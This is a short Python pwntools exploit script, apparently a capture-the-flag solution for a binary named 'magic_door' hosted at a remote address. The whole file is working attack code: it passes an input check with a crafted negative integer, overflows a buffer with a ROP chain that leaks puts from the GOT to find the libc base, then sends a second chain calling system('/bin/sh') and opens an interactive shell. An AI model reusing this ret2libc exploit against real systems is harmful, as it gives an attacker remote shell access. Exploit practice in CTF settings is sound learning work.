from pwn import *
#io = process("./magic_door",aslr=False)
io = remote("13.229.222.125",32837)
libc = ELF("./libc.so.6")

# gadgets
entry = p64(0x401190)
popRdi = p64(0x401434)
putsPlt = p64(0x4010e0)
putsGot = p64(0x404018)
ret = p64(0x401388)

io.sendlineafter(b"Which door would you like to open?",b"-4294917281")

# leak libc and restart binary 
rop  = b"A"*0x48
rop += popRdi + putsGot + putsPlt + entry
io.sendlineafter(b"Where would you like to go?",rop)

io.recv()
libc.address = u64(io.recv(6).ljust(8,b"\x00")) - libc.symbols["puts"]
log.info("LIBC BASE: " + hex(libc.address))


io.sendlineafter(b"Which door would you like to open?",b"-4294917281")

# I have to add a ret gadget to my rop to make the stack 64 bit aligned to prevent the movaps issue
# more on that here: https://ropemporium.com/guide.html 
rop  = b"A"*0x48
rop += ret + popRdi + p64(next(libc.search(b"/bin/sh"))) + p64(libc.symbols["system"])

io.sendlineafter(b"Where would you like to go?",rop)
io.interactive()
